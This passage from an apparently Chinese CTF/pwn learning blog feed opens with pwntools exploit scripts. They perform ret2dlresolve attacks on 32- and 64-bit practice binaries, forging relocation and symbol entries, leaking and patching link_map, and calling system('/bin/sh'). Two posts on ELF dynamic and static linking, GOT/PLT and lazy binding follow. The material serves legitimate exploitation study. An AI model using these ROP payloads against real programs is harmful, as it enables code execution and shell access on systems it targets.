class="line">rel_plt_addr=elf.get_section_by_name(<span class="string">&#x27;.rel.plt&#x27;</span>).header.sh_addr</span><br><span class="line">dynstr_addr=elf.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).header.sh_addr</span><br><span class="line">dynsym_addr=elf.get_section_by_name(<span class="string">&#x27;.dynsym&#x27;</span>).header.sh_addr</span><br><span class="line">bss_addr=elf.get_section_by_name(<span class="string">&#x27;.bss&#x27;</span>).header.sh_addr</span><br><span class="line">fake_stack=bss_addr+<span class="number">0x800</span></span><br><span class="line"></span><br><span class="line">payload =<span class="string">b&#x27;a&#x27;</span>*offset+p32(read_plt)</span><br><span class="line">payload+=p32(pop_esi_edi_ebp_ret)</span><br><span class="line">payload+=p32(<span class="number">0</span>)+p32(fake_stack)+p32(<span class="number">0x300</span>)</span><br><span class="line">payload+=p32(pop_ebp_ret)</span><br><span class="line">payload+=p32(fake_stack)</span><br><span class="line">payload+=p32(leave_ret)</span><br><span class="line"></span><br><span class="line">sla(io,<span class="string">&#x27;Input:&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fake_write_reloc_age=fake_stack+<span class="number">5</span>*<span class="number">4</span>-rel_plt_addr</span><br><span class="line">align=<span class="number">0x10</span>-((fake_stack+<span class="number">36</span>-<span class="number">8</span>-dynsym_addr)%<span class="number">16</span>)<span class="comment">#这里是为了保证我们wrte函数虚假的符号表项地址是16字节对齐的，这里为后面做一个补齐</span></span><br><span class="line">fake_write_Elf32_Sym_addr=fake_stack+<span class="number">36</span>-<span class="number">8</span>+align</span><br><span class="line">fake_info=((((fake_write_Elf32_Sym_addr-dynsym_addr)//<span class="number">16</span>)&lt;&lt;<span class="number">8</span>)|<span class="number">0x7</span>)<span class="comment">#最后|0x7是为了保证重定位类型不变</span></span><br><span class="line">fake_write_str_addr=fake_stack+<span class="number">36</span>-<span class="number">8</span>+align+<span class="number">0x10</span></span><br><span class="line">fake_st_name=fake_write_str_addr-dynstr_addr</span><br><span class="line"></span><br><span class="line">fake_write_Elf32_Rel=p32(write_got)+p32(fake_info)</span><br><span class="line">fake_write_Elf32_Sym=p32(fake_st_name)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0x12</span>)</span><br><span class="line">fake_write_str=<span class="string">&#x27;system\x00&#x27;</span></span><br><span class="line">cmd=<span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload =p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(plt_0)</span><br><span class="line">payload+=p32(fake_write_reloc_age)</span><br><span class="line">payload+=p32(<span class="number">0</span>)<span class="comment">#返回地址</span></span><br><span class="line">payload+=p32(fake_stack+<span class="built_in">len</span>(payload)+<span class="built_in">len</span>(fake_write_Elf32_Rel)+<span class="built_in">len</span>(fake_write_Elf32_Sym)+<span class="built_in">len</span>(fake_write_str)+align+<span class="number">4</span>)</span><br><span class="line">payload+=fake_write_Elf32_Rel</span><br><span class="line">payload+=align*<span class="string">&#x27;a&#x27;</span></span><br><span class="line">payload+=fake_write_Elf32_Sym</span><br><span class="line">payload+=fake_write_str</span><br><span class="line">payload+=cmd</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">sl(io,payload)</span><br><span class="line">rv(io)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="64位下伪造reloc-age和伪造Elf32-Rel、Elf32-Sym结构体进行攻击（Partial-RELRO）"><a href="#64位下伪造reloc-age和伪造Elf32-Rel、Elf32-Sym结构体进行攻击（Partial-RELRO）" class="headerlink" title="64位下伪造reloc_age和伪造Elf32_Rel、Elf32_Sym结构体进行攻击（Partial RELRO）"></a>64位下伪造reloc_age和伪造Elf32_Rel、Elf32_Sym结构体进行攻击（Partial RELRO）</h3><p>在开始攻击之前我们要先来看看64位下一些结构体的变化</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    Elf64_Addrr_offset;</span><br><span class="line">    Elf64_Xwordr_info;</span><br><span class="line">    Elf64_Sxwordr_addend;</span><br><span class="line">&#125; Elf64_Rela;</span><br></pre></td></tr></table></figure><p>这里相较于32位每个成员的大小变为了64位，即为8个字节，多了一个r_addend，一共为24个字节。Elf32_Rela 中是用r_addend 显式地指出加数;而对 Elf32_Rel来说,加数是隐含在被修改的位置里的。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">Elf64_Wordst_name;               </span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>st_info;               </span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>st_info;                </span><br><span class="line">Elf64_Sectionst_shndx;                </span><br><span class="line">Elf64_Addrst_value;                </span><br><span class="line">Elf64_Xwordst_size;               </span><br><span class="line">&#125; Elf64_Sym;</span><br></pre></td></tr></table></figure><p>其中st_name为32位，st_info和st_info各8位，st_shndx为16位，st_value和st_size各64位，一共为24个字节。</p><p>我们通过上面的分析知道64位有高概率会劫持失败，所以我们需要做一些额外的操作</p><p>还是之前的代码</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">  <span class="keyword">if</span> (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Half)</span> *vernum </span>=</span><br><span class="line">    (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);</span><br><span class="line">  ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; <span class="number">0x7fff</span>;</span><br><span class="line">  version = &amp;l-&gt;l_versions[ndx];</span><br><span class="line">  <span class="keyword">if</span> (version-&gt;hash == <span class="number">0</span>)</span><br><span class="line">    version = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以看到如果不进入这个判断语句就不会触发，也就是把 l-&gt;l_info[VERSYMIDX(DT_VERSYM)] 设置为 NULL。我们知道<strong>got表的第零项储存的是link_map</strong>,这样我们只需要泄露并修改掉 l-&gt;l_info[VERSYMIDX(DT_VERSYM)] 即可，而其偏移可以通过调试得到是0x1c8</p><p>剩下的和32差别不大，就不一一列举了，一次放在exp中</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">io=process(<span class="string">&#x27;./level3_partialrelro_64&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./level3_partialrelro_64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ru = <span class="keyword">lambda</span> p, x ,drop=<span class="literal">False</span>: p.recvuntil(x,drop)</span><br><span class="line">sn = <span class="keyword">lambda</span> p, x            : p.send(x)</span><br><span class="line">rl = <span class="keyword">lambda</span> p               : p.recvline()</span><br><span class="line">sl = <span class="keyword">lambda</span> p, x            : p.sendline(x)</span><br><span class="line">rv = <span class="keyword">lambda</span> p, x=<span class="number">1024</span>       : p.recv(numb = x)</span><br><span class="line">sa = <span class="keyword">lambda</span> p, a, b         : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> p, a, b        : p.sendlineafter(a,b)</span><br><span class="line">rr = <span class="keyword">lambda</span> p, t            : p.recvrepeat(t)</span><br><span class="line">rd = <span class="keyword">lambda</span> p, x            : p.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">offset=<span class="number">120</span></span><br><span class="line"></span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_got=elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">link_map_got=<span class="number">0x404008</span></span><br><span class="line">read_plt=elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">main_addr=elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">vuln_addr=<span class="number">0x401156</span></span><br><span class="line">plt_0=<span class="number">0x401020</span></span><br><span class="line"></span><br><span class="line">dynstr_addr=elf.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).header.sh_addr</span><br><span class="line">dynsym_addr=elf.get_section_by_name(<span class="string">&#x27;.dynsym&#x27;</span>).header.sh_addr</span><br><span class="line">bss_addr=elf.get_section_by_name(<span class="string">&#x27;.bss&#x27;</span>).header.sh_addr</span><br><span class="line">rel_plt_addr=elf.get_section_by_name(<span class="string">&#x27;.rela.plt&#x27;</span>).header.sh_addr<span class="comment">#64位中.rel.plt被称作.rela.plt</span></span><br><span class="line">fake_stack=bss_addr+<span class="number">0x800</span></span><br><span class="line"></span><br><span class="line">gadget1=<span class="number">0x40121A</span>    <span class="comment">#pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; retn</span></span><br><span class="line">gadget2=<span class="number">0x401200</span>    <span class="comment">#mov rdx, r14; mov rsi, r13; mov edi, r12d; call qword ptr [r15+rbx*8]</span></span><br><span class="line">pop_rdi_ret=<span class="number">0x0000000000401223</span></span><br><span class="line">pop_rsi_r15_ret=<span class="number">0x0000000000401221</span></span><br><span class="line">pop_rbp_ret=<span class="number">0x40113d</span></span><br><span class="line">ret=<span class="number">0x000000000040101a</span></span><br><span class="line">leave_ret=<span class="number">0x40118f</span></span><br><span class="line"></span><br><span class="line">payload =<span class="string">&#x27;a&#x27;</span>*offset</span><br><span class="line">payload+=p64(gadget1)</span><br><span class="line">payload+=p64(<span class="number">0</span>)<span class="comment">#rbx 为了后面跳转做偏移</span></span><br><span class="line">payload+=p64(<span class="number">0x1</span>)<span class="comment">#rbp,不可为0</span></span><br><span class="line">payload+=p64(<span class="number">0x1</span>)<span class="comment">#r12 -&gt; rdi</span></span><br><span class="line">payload+=p64(link_map_got)<span class="comment">#r13 -&gt; rsi</span></span><br><span class="line">payload+=p64(<span class="number">0x8</span>)<span class="comment">#r14-&gt;rdx</span></span><br><span class="line">payload+=p64(write_got)<span class="comment">#r15</span></span><br><span class="line">payload+=p64(gadget2)<span class="comment">#ret</span></span><br><span class="line">payload+=<span class="string">&#x27;A&#x27;</span>*<span class="number">0x38</span><span class="comment">#返回后对栈会进行pop</span></span><br><span class="line">payload+=p64(vuln_addr)</span><br><span class="line"></span><br><span class="line">sla(io,<span class="string">&quot;Input:\n&quot;</span>,payload)</span><br><span class="line">link_map_addr=u64(rv(io,<span class="number">8</span>))</span><br><span class="line">success(<span class="string">&#x27;link_map_addr : &#x27;</span>+<span class="built_in">hex</span>(link_map_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload =<span class="string">&#x27;a&#x27;</span>*offset</span><br><span class="line">payload+=p64(gadget1)</span><br><span class="line">payload+=p64(<span class="number">0</span>)<span class="comment">#rbx 为了后面跳转做偏移</span></span><br><span class="line">payload+=p64(<span class="number">0x1</span>)<span class="comment">#rbp</span></span><br><span class="line">payload+=p64(<span class="number">0x0</span>)<span class="comment">#r12 -&gt; rdi</span></span><br><span class="line">payload+=p64(fake_stack)<span class="comment">#r13 -&gt; rsi</span></span><br><span class="line">payload+=p64(<span class="number">0x500</span>)<span class="comment">#r14-&gt;rdx</span></span><br><span class="line">payload+=p64(read_got)<span class="comment">#r15</span></span><br><span class="line">payload+=p64(gadget2)<span class="comment">#ret</span></span><br><span class="line">payload+=<span class="string">&#x27;A&#x27;</span>*<span class="number">0x38</span><span class="comment">#返回后对栈会进行pop</span></span><br><span class="line">payload+=p64(pop_rbp_ret)<span class="comment">#栈劫持防止环境变量被破坏</span></span><br><span class="line">payload+=p64(fake_stack)</span><br><span class="line">payload+=p64(leave_ret)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">sla(io,<span class="string">&#x27;Input:\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">fake_write_Elf64_Rela_base_addr=fake_stack+<span class="number">0x100</span></span><br><span class="line">fake_write_Elf64_Sym_base_addr=fake_stack+<span class="number">0x180</span></span><br><span class="line">fake_write_str_addr=fake_stack+<span class="number">0x200</span></span><br><span class="line">binsh_addr=fake_stack+<span class="number">0x208</span></span><br><span class="line"></span><br><span class="line">rel_plt_align=<span class="number">0x18</span>-(fake_write_Elf64_Rela_base_addr-rel_plt_addr)%<span class="number">0x18</span></span><br><span class="line">rel_sym_align=<span class="number">0x18</span>-(fake_write_Elf64_Sym_base_addr-dynsym_addr)%<span class="number">0x18</span></span><br><span class="line"></span><br><span class="line">fake_write_Elf64_Rela_addr=fake_write_Elf64_Rela_base_addr+rel_plt_align</span><br><span class="line">fake_write_Elf64_Sym_addr=fake_write_Elf64_Sym_base_addr+rel_sym_align</span><br><span class="line"></span><br><span class="line">fake_write_reloc_age=(fake_write_Elf64_Rela_addr-rel_plt_addr)/<span class="number">0x18</span></span><br><span class="line">fake_info=(((fake_write_Elf64_Sym_addr-dynsym_addr)/<span class="number">0x18</span>)&lt;&lt;<span class="number">0x20</span>)|<span class="number">0x7</span> </span><br><span class="line">fake_st_name=fake_write_str_addr-dynstr_addr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fake_write_Elf64_Rela =p64(write_got)</span><br><span class="line">fake_write_Elf64_Rela+=p64(fake_info)</span><br><span class="line">fake_write_Elf64_Rela+=p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">fake_write_Elf64_Sym =p32(fake_st_name)</span><br><span class="line">fake_write_Elf64_Sym+=p32(<span class="number">0x12</span>)</span><br><span class="line">fake_write_Elf64_Sym+=p64(<span class="number">0</span>)</span><br><span class="line">fake_write_Elf64_Sym+=p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#改写l_info[VERSYMIDX(DT_VERSYM)] </span></span><br><span class="line">payload =p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(gadget1)</span><br><span class="line">payload+=p64(<span class="number">0</span>)<span class="comment">#rbx 为了后面跳转做偏移</span></span><br><span class="line">payload+=p64(<span class="number">0x1</span>)<span class="comment">#rbp</span></span><br><span class="line">payload+=p64(<span class="number">0x0</span>)<span class="comment">#r12 -&gt; rdi</span></span><br><span class="line">payload+=p64(link_map_addr+<span class="number">0x1c8</span>)<span class="comment">#r13 -&gt; rsi</span></span><br><span class="line">payload+=p64(<span class="number">8</span>)<span class="comment">#r14-&gt;rdx</span></span><br><span class="line">payload+=p64(read_got)<span class="comment">#r15</span></span><br><span class="line">payload+=p64(gadget2)<span class="comment">#ret</span></span><br><span class="line">payload+=<span class="string">&#x27;A&#x27;</span>*<span class="number">0x38</span><span class="comment">#返回后对栈会进行pop</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#调用system</span></span><br><span class="line">payload+=p64(pop_rdi_ret)</span><br><span class="line">payload+=p64(binsh_addr)</span><br><span class="line">payload+=p64(plt_0)</span><br><span class="line">payload+=p64(fake_write_reloc_age)</span><br><span class="line">payload =payload.ljust(<span class="number">0x100</span>,<span class="string">&#x27;A&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#构造虚假的重定位表项</span></span><br><span class="line">payload+=<span class="string">&#x27;A&#x27;</span>*rel_plt_align</span><br><span class="line">payload+=fake_write_Elf64_Rela</span><br><span class="line">payload =payload.ljust(<span class="number">0x180</span>,<span class="string">&#x27;A&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#构造虚假的符号表项</span></span><br><span class="line">payload+=<span class="string">&#x27;A&#x27;</span>*rel_sym_align</span><br><span class="line">payload+=fake_write_Elf64_Sym</span><br><span class="line">payload =payload.ljust(<span class="number">0x200</span>,<span class="string">&#x27;A&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#构造虚假的字符串</span></span><br><span class="line">payload+=<span class="string">&#x27;system\x00\x00&#x27;</span></span><br><span class="line">payload+=<span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">sn(io,payload)</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">sn(io,p64(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Pwn </category>
          
          <category> X86/x64pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>与ret2dl有关的前置知识-动态链接</title>
      <link href="/2021/08/11/%E4%B8%8Eret2dl%E6%9C%89%E5%85%B3%E7%9A%84%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86-%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/"/>
      <url>/2021/08/11/%E4%B8%8Eret2dl%E6%9C%89%E5%85%B3%E7%9A%84%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86-%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>之前写这篇博客的时候没有学习静态链接就去补了补知识，索性把这篇博客也改为基础知识，后面再写具体的攻击方法。看这篇前可以先了解一下静态链接。</p><h1 id="一些重要的section"><a href="#一些重要的section" class="headerlink" title="一些重要的section"></a>一些重要的section</h1><h2 id="“-interp”"><a href="#“-interp”" class="headerlink" title="“.interp”"></a>“.interp”</h2><p>当我们的系统将可执行文件装载之后，其中好多地址还处于无效状态，此时需要<strong>动态链接器</strong>通过映射的方法加载到进程的地址空间中。操作系统加载完动态链接器后，将控制权交给动态链接器的入口地址。动态链接器获取控制器，执行自身初始化工作，然后根据环境参数对可执行文件进行动态链接工作。当动态链接工作完成后将控制权交由可执行文件入口，程序开始正式执行。</p><p>而动态链接器的位置由谁来决定那？实际上是由ELF文件自己决定的，而决定这一切的section叫做<em><strong>.interp</strong></em>。</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210726111522241.png" alt="’.interp‘"></p><p>上图就是某个文件的’.interp’段，大多数情况下动态链接器都位于/lib里，但是这里我用patchelf更改过了，也说明这里是可以更改的，由ELF文件自己决定的。</p><p>这个段的内容很简单，里面就保存了上面这样的字符串，而这个字符串就是动态链接器的路径。</p><h2 id="“-dynamic”"><a href="#“-dynamic”" class="headerlink" title="“.dynamic”"></a>“.dynamic”</h2><p>动态链接最为重要的结构就是<em><strong>.dynamic</strong></em>，这个段保存了动态链接库需要的最基本的信息，比如依赖于哪些共享对象、动态连接符号表的位置、动态链接重定位表位置、共享对象初始化代码的地址等。书上写这个section有点类似于ELF的文件头，确实，其形式更像是ELF Header，而我觉得这个部分功能上更接近SHT，有着和SHT相似的功能，都是帮助我们寻找到section的，或许可以说是二者的结合。</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210727162459172.png" alt="&#39;.dynamic&#39;"></p><p>其结构体为</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf32_Sword d_tag;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        Elf32_Word d_val;</span><br><span class="line">        Elf32_Addr d_ptr;</span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; Elf32_Dyn;</span><br></pre></td></tr></table></figure><table><thead><tr><th>类型</th><th>说明</th></tr></thead><tbody><tr><td>NEEDED</td><td>依赖的共享对象文件</td></tr><tr><td>INIT</td><td>初始化代码地址，也就是.init的位置</td></tr><tr><td>FINT</td><td>是结束代码地址，也就是.fini的位置</td></tr><tr><td>GUN_HASH</td><td>动态链接哈希表地址</td></tr><tr><td>STRTAB</td><td>动态链接字符串表的位置，表示.dynstr的位置</td></tr><tr><td>SYMTAB</td><td>动态链接符号表的位置,表示.dynsym的位置;</td></tr><tr><td>PLTGOT</td><td>指向.got的位置</td></tr><tr><td>JMPREL</td><td>表示重定位表，也就是.rel.plt</td></tr><tr><td>REL\RELA</td><td>表示动态链接重定位表的位置;RELENT/RELAENT表示动态重读位表入口数量</td></tr></tbody></table><p>在静态链接中我们是通过</p><h2 id="“-dynsym”-”-dynstr”-amp-”-hash”"><a href="#“-dynsym”-”-dynstr”-amp-”-hash”" class="headerlink" title="“.dynsym”,”.dynstr”&amp;”.hash”"></a>“.dynsym”,”.dynstr”&amp;”.hash”</h2><p>在静态链接中有一个专门的段叫做<em><strong>.symtab</strong></em>,里面保存了所有关于该目标的符号的定义和引用.而为了表示动态链接模块间的符号导入导出关系,ELF专门有一个叫做<strong>动态链接符号表</strong>的段用来保存这些信息,也就是<em><strong>.dynsym</strong></em>.</p><p>重要的是”.dynsym”只保存了动态链接相关的符号,而模块内私有的变量则不会保存，这一点和静态链接中符号表是相似的.通常动态链接的模块同时包含:”.symtab”和”。”.dynsm“这两个段。”.symtab”包含所有的符号,也包括”.dynsym”中的符号.</p><p>“.strtab”,一个用于保存符号名的字符串表.而”.cybsym”对应的就是动态符号字符串表</p><p><em><strong>.dynstr</strong></em>.用于动态链接中我们需要在程序运行的时候查找符号,为了加快符号的查找过程,往往通过<strong>符号哈希表</strong>—<em><strong>.hash</strong></em>来加快符号查找速度，这个是动态链接独有的.</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210727170027080.png" alt="&#39;.dynsym&#39;"></p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210727170510147.png" alt="&#39;.hash&#39;"></p><h2 id="“-rel-dyn”-amp-”-rel-plt”"><a href="#“-rel-dyn”-amp-”-rel-plt”" class="headerlink" title="“.rel.dyn”&amp;”.rel.plt”"></a>“.rel.dyn”&amp;”.rel.plt”</h2><p>静态链接中有<em><strong>.rel.text</strong></em>(代码段重定位表)和<em><strong>.rel.data</strong></em>(数据段重定位表)作为静态链接中用于表示重定位信息的重定位表.</p><p>在动态链接中自然也有与之对应的重定位表<em><strong>.rel.dyn</strong></em>,<em><strong>.rel,plt</strong></em>.”rel.dtn”实际上是对数据引用的修正,它所修正的位置位于”.got”以及数据段;而”.rel.plt”是对函数引用的修正,它所修正的位置位于”.got.plt”.</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210727180200847.png" alt="&#39;.rel.fyn&#39;&amp;&#39;.rel.plt&#39;"></p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210727180447657.png" alt="SHT"></p><h1 id="动态链接和静态链接不同以及解决方法"><a href="#动态链接和静态链接不同以及解决方法" class="headerlink" title="动态链接和静态链接不同以及解决方法"></a>动态链接和静态链接不同以及解决方法</h1><p>动态链接和静态链接相同需要解决符号解析和重定位的问题，这部分和静态链接是差不多的，只有其指令修正方式会有所不同。最大的问题在于：<strong>由于其共享库数量不能确定，我们不可能进行Segement 合并</strong>，当加载多个共享库时，所有的共享库都需要驻留在Mmap中，独自占有一块空间。因此共享库需要支持任意地址被加载，共享库的起始位置只有当运行的时候才会被确定。</p><h2 id="位置无关代码-PIC"><a href="#位置无关代码-PIC" class="headerlink" title="位置无关代码(PIC)"></a>位置无关代码(PIC)</h2><h3 id="GOT"><a href="#GOT" class="headerlink" title="GOT"></a>GOT</h3><p>为了可以解决动态链接中出现的这些问题，这里采取PIC技术。PIC的实现依赖于一个事实：EOF文件的Segment是按照它们在磁盘文件中的结构被复制到运行内存的。这一点可能对于我们来说司空见惯了，EOF文件中任何一个付号对于文件的偏移在加载到内存后都是固定的。然而这是实现PIC的关键所在，因为这样的话，<strong>任何两个符号之间的偏移就会变成一个固定的值</strong>。</p><p>PIC通过<strong>全局偏移表</strong>也就是我们经常劫持的GOT表来实现，GOT被储存在.data段中，正如我们上面所说的其关于.text的偏移是固定的。当GOT表在磁盘上的时候其值是为空的，只有当EOF文件被加载到内存后，才有可能让动态链接器根据重定位表和符号表找到符号的绝对地址，将其写入got表。</p><h3 id="PLT"><a href="#PLT" class="headerlink" title="PLT"></a>PLT</h3><p>GOT解决了共享库的全局变量引用，但是我们还要处理函数调用。这里就需要<strong>函数链接表</strong>：PLT表。</p><p>因为我们不可以修改.text段，所以我们需要采用GOT加PLT的方法，PLT表跳转的位置指向GOT表储存的地址。</p><h3 id="延迟绑定"><a href="#延迟绑定" class="headerlink" title="延迟绑定"></a>延迟绑定</h3><p>ELF下的<strong>延迟绑定</strong>过程——<em><strong>PLT</strong></em>，在ELF文件中当我们调用函数都是通过一个叫做PLT项的结构来进行跳转的，假设我们有一个bar()函数，其在PLT中的地址我们称为bar@PLT。那么其实现为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bar@plt:</span><br><span class="line">jmp *(bar@GOT)</span><br><span class="line">push n</span><br><span class="line">push moduleID</span><br><span class="line">jump _dl_runtime_resolve</span><br></pre></td></tr></table></figure><p>bar@plt的第一条通过GOT间接跳转指令，假设我们已经进行过延迟绑定，此时bar@GOT里存放这我们真正的bar函数对应的项，那么这个跳转指令自然会跳转到我们想要的地方。但是，如果还没有进行过延迟绑定那，那么此时这里存放的必定不是我们想要的地址，<strong>此时bar@GOT存放的其实是bar@plt的第二条指令</strong>，第二条指令是将一个数字n压入栈里，而这个数字是<strong>bar这个符号引用在重定位表”.rel.plt”的下标</strong>。接下来又一个push将指令模块的ID压入栈中，最后再跳转到**_dl_runtime_resolve**。</p><p>当bar()这个函数被解析过一次，那么下次调用就不用再次重定位，只需要直接跳转到bar()函数中。ELF将GOT拆为两个表”.got”和 “.got.plt”，其中”.got”来报存全局变量引用地址，”.got.plt”保存函数引用地址。</p><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>以上基本阐述了动态链接的过程，接下来就是**_dl_runtime_resolve**这个函数的问题了。这个留在ret2dl再讨论吧</p>]]></content>
      
      
      <categories>
          
          <category> Base </category>
          
          <category> link </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Base </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>与ret2dl有关的前置知识-link</title>
      <link href="/2021/08/09/%E4%B8%8Eret2dl%E6%9C%89%E5%85%B3%E7%9A%84%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86-link/"/>
      <url>/2021/08/09/%E4%B8%8Eret2dl%E6%9C%89%E5%85%B3%E7%9A%84%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86-link/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>我们rop里有一种高级的攻击方法ret2dl，它和动态链接有关，在我去学习ret2dl时发现自己对ELF文件中的一些section不是那么熟悉，而且不了解静态链接是怎么完成的，对动态链接的过程有些不知所措，这里总结一下最近学习的静态链接以及其相关section对ret2dl做一些补充说明。我这里只表述我认为的静态链接最为关键的部分，如果对其他方面有兴趣可以在参考部分寻找需要的资料。</p><h1 id="ELF结构"><a href="#ELF结构" class="headerlink" title="ELF结构"></a>ELF结构</h1><p>ELF文件最前方的是<strong>ELF文件头</strong> (<strong>ELF Header</strong>)，包含着文件的基本信息，接下来就是ELF文件的各种段。在这些不同的段中最为重要的就是<strong>段表</strong>(<strong>section Header Table</strong>)，也就是<em><strong>SHT</strong></em>，这个段表述了ELF文件中包含的所有段信息。</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210809165314132.png" alt="ELF结构"></p><p>我们先看看链接器是如何分析一个ELF文件的</p><h1 id="静态链接的重要section，以及链接器的分析"><a href="#静态链接的重要section，以及链接器的分析" class="headerlink" title="静态链接的重要section，以及链接器的分析"></a>静态链接的重要section，以及链接器的分析</h1><h2 id="ELF-Header"><a href="#ELF-Header" class="headerlink" title="ELF Header"></a>ELF Header</h2><p>我们可以通过</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">readelf -h &lt;file name&gt;</span><br></pre></td></tr></table></figure><p>这样的命令来查看一个ELF文件的文件头，这里不妨查看libc的ELF Header</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210809170056849.png" alt="ELF Header"></p><p>通过上图可以看到ELF文件里定义了很多东西，包括魔数、文件机器字节长度、储存方式等信息，而这里对我们静态链接过程中最为重要的就是<strong>Start of section headers</strong>，这里是我们段表在文件中的偏移，通过上图我们知道段表在文件的第1864377字节开始。而链接器也会通过该项找到我们SHT的位置。</p><h2 id="Section-Header-Table-SHT"><a href="#Section-Header-Table-SHT" class="headerlink" title="Section Header Table(SHT)"></a>Section Header Table(SHT)</h2><p>我们的ELF文件中有各种各样的不同段，而段表就是记录这些段的基本，通过上面查看的ELF Header可以得到段表的起始位置为1864377 Bytes，每个表项大小是64 Bytes，一共是72项</p><p>我们可以通过</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">readelf -S &lt;file name&gt;</span><br></pre></td></tr></table></figure><p>这样的命令来查看每个段的具体信息</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210809175848346.png" 